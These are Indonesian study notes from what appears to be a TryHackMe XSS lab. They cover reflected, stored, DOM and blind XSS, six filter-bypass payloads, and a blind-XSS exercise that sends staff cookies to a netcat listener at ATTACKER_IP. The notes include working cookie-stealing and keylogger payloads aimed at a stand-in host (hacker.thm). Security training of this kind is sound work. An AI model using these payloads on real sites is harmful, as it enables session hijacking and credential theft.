```
=== XSS (Cross-Site Scripting) - Resume Materi ===
[10 Mar 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU XSS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Injection attack di mana JavaScript berbahaya disuntikkan
           ke dalam web application untuk dieksekusi pengguna lain
Syarat   : Website tidak memvalidasi/memfilter input pengguna
Analogi  : Menaruh instruksi hipnosis di papan tulis umum — siapapun
           yang baca, ter-hipnosis tanpa sadar
Bug Bounty nyata :
  → Shopify     : ditemukan & dilaporkan
  → Steam Chat  : $7,500
  → HackerOne   : $2,500
  → Infogram    : ditemukan & dilaporkan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PAYLOAD & BAGIAN-BAGIANNYA
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi   : Kode JavaScript yang ingin dieksekusi di browser target
2 Bagian   :
  Intention    = tujuan — apa yang ingin dilakukan script
  Modification = penyesuaian kode agar bisa jalan di konteks tertentu

Tipe Intention :
  Proof of Concept → buktikan XSS bisa jalan
                     <script>alert('XSS');</script>

  Session Stealing → curi cookie korban, encode base64, kirim ke attacker
                     <script>fetch('https://hacker.thm/steal?cookie='
                     + btoa(document.cookie));</script>

  Key Logger       → catat semua tombol yang ditekan korban
                     <script>document.onkeypress = function(e)
                     { fetch('https://hacker.thm/log?key='
                     + btoa(e.key) );}</script>

  Business Logic   → panggil fungsi JS spesifik di aplikasi
                     <script>user.changeEmail('attacker@hacker.thm');
                     </script>
                     → lalu lakukan reset password attack

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 4 TIPE XSS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. REFLECTED XSS
   Cara kerja : Input user langsung dipantulkan ke halaman tanpa validasi
   Contoh     : parameter ?error= di URL langsung muncul di halaman
   Alur       : Attacker kirim link berbahaya → korban klik →
                script jalan di browser korban → data terkirim ke attacker
   Dampak     : curi cookie, redirect, eksekusi kode di browser korban
   Test di    : URL Query String, URL File Path, HTTP Headers

2. STORED XSS
   Cara kerja : Payload disimpan di database, jalan setiap ada yang buka halaman
   Contoh     : komentar blog yang tidak difilter
   Alur       : Attacker tanam payload → tersimpan di DB →
                setiap user buka halaman → script otomatis jalan
   Dampak     : redirect, curi cookie, lakukan aksi sebagai user
   Test di    : Komentar blog, profil user, website listings
   Catatan    : Coba bypass validasi client-side dengan kirim
                request manual (bukan lewat form)

3. DOM BASED XSS
   Cara kerja : Eksekusi JS terjadi di browser tanpa data ke server
                JS website membaca input lalu menulis ke DOM langsung
   Contoh     : window.location.hash dibaca lalu ditulis ke halaman
   Dampak     : redirect, curi konten/sesi
   Test di    : Cari variabel yang bisa dikontrol attacker seperti
                window.location.x di source code
                Perhatikan apakah nilainya ditulis ke DOM atau
                masuk ke fungsi berbahaya seperti eval()

4. BLIND XSS
   Cara kerja : Seperti Stored XSS tapi attacker tidak bisa lihat
                payload bekerja atau test pada diri sendiri
   Contoh     : Form kontak → jadi support ticket → dibuka staff
                di portal privat yang tidak bisa diakses attacker
   Dampak     : dapat URL portal privat, cookie staff, isi halaman,
                hijack sesi staff
   Test       : Payload WAJIB punya callback (HTTP request) agar
                tahu kapan kode dieksekusi
   Tool       : XSS Hunter Express → auto capture cookies, URLs,
                page contents

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 CARA BACA KONTEKS PAYLOAD (PALING PENTING)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Langkah  : View Page Source → cari di mana inputmu muncul

Konteks HTML  → input muncul di dalam tag HTML biasa
                <h2>Hello, Adam</h2>
                Senjata : tag seperti <script>, </textarea>, ">

Konteks JS    → input muncul di dalam blok <script>
                document.getElementsByClassName('name')[0]
                .innerHTML='Adam';
                Senjata : sintaks JS seperti ' ; //

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PERFECTING PAYLOAD — 6 LEVEL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Target semua level : jalankan alert('THM')

Level 1 → Konteks : di dalam <h2> tag biasa
          Payload  : <script>alert('THM');</script>
          Kenapa   : tidak ada filter, langsung masuk

Level 2 → Konteks : di dalam value="" attribute input tag
          Payload  : "><script>alert('THM');</script>
          Kenapa   : " menutup value, > menutup input tag,
                     script bebas jalan di luar

Level 3 → Konteks : di dalam <textarea> tag
          Payload  : </textarea><script>alert('THM');</script>
          Kenapa   : </textarea> menutup tag dulu,
                     baru script jalan

Level 4 → Konteks : di dalam blok JavaScript (innerHTML='Adam')
          Payload  : ';alert('THM');//
          Kenapa   : ' tutup string, ; akhiri perintah,
                     alert jalan, // jadikan sisa jadi komentar

Level 5 → Konteks : ada filter yang hapus kata "script"
          Payload  : <sscriptcript>alert('THM');</sscriptcript>
          Kenapa   : filter hapus "script" di tengah,
                     sisa hurufnya menyatu jadi <script> lagi

Level 6 → Konteks : di dalam src="" attribute img tag,
                     karakter < dan > difilter
          Payload  : /images/cat.jpg" onload="alert('THM');
          Kenapa   : pakai event handler onload milik img tag,
                     tidak butuh karakter < > sama sekali

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 POLYGLOT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Satu payload yang bisa bypass semua konteks & filter sekaligus
Isi      : Gabungan teknik escape untuk HTML attr, JS string,
           textarea, script tag, img onload, encoding hex
Pakai    : Paste langsung ke field input seperti payload biasa
Limitasi : Filter canggih (WAF) bisa deteksi & blokir
           Panjang & mencolok → mudah terdeteksi monitoring
           Ada batasan panjang karakter di beberapa form
Fungsi   : Cocok untuk reconnaissance cepat — cek ada celah
           XSS atau tidak, bukan untuk eksploitasi mendalam

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PRACTICAL — BLIND XSS COOKIE STEALING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tujuan   : Curi cookie staff yang membuka support ticket

Step 1 → Jalankan Netcat listener di AttackBox
         nc -nlvp 9001
         Catatan : p HARUS di posisi terakhir sebelum angka port

Step 2 → Buat payload pencuri cookie
         </textarea><script>fetch('http://ATTACKER_IP:9001
         ?cookie=' + btoa(document.cookie));</script>
         Gunakan IP AttackBox (bukan IP target!)

Step 3 → Submit payload sebagai isi tiket/form

Step 4 → Tunggu staff buka tiket →
         Netcat terima request berisi cookie ter-encode

Step 5 → Decode di https://www.base64decode.org/
         → dapat cookie asli staff

Kenapa btoa() / base64 encode :
  Cookie sering punya karakter spesial (= & + ; spasi)
  yang punya makna khusus di URL → data bisa rusak/terpotong
  Base64 encode → semua jadi karakter aman → data sampai utuh

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 NETCAT FLAGS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-n  → no DNS resolution (hindari resolusi hostname)
-l  → listen mode (tunggu koneksi masuk)
-v  → verbose (tampilkan detail & error)
-p  → tentukan port → WAJIB diikuti angka, selalu taruh terakhir

Contoh valid  : nc -nlvp 9001 / nc -lvnp 9001 / nc -vnlp 9001
Contoh SALAH  : nc -nlpv 9001 (p tidak langsung diikuti angka)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Payload        = kode JS berbahaya yang disuntikkan
Injection      = teknik menyisipkan kode ke dalam input
Reflected      = payload dipantulkan langsung dari server
Stored         = payload disimpan di DB, jalan tiap halaman dibuka
DOM            = Document Object Model, struktur halaman di browser
eval()         = fungsi JS yang eksekusi string sebagai kode → BERBAHAYA
btoa()         = fungsi JS untuk base64 encode string
document.cookie= akses semua cookie di halaman saat ini
fetch()        = fungsi JS untuk kirim HTTP request
WAF            = Web Application Firewall, filter keamanan website
Exfiltrate     = mencuri & mengirim data keluar dari sistem target
Netcat (nc)    = tool jaringan untuk buat koneksi TCP/UDP,
                 bisa jadi listener untuk terima data
Callback       = sinyal balik dari payload ke attacker bahwa
                 kode sudah dieksekusi
onload         = event handler HTML yang jalan setelah elemen dimuat
Event Handler  = atribut HTML yang jalankan JS saat event tertentu
                 terjadi (onload, onerror, onmouseover, onfocus)
```